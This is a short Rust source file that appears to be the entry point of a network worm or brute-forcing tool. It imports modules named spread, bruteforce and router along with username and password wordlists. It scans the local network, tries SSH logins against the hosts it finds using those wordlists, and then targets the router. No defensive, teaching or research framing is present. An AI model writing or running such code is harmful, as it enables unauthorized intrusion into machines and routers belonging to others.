#[allow(unused)]
use brute::{localnet, spread, bruteforce, router};
use brute::wordlist::{USERNAMES, PASSWORDS};

fn main() {
    let targets = localnet::localipstem();
    match targets {
        Some(x) => bruteforce::ssh(x, USERNAMES, PASSWORDS),
        None => println!("No vulnerable computers, moving on"),
    }
    router::target_router();
}

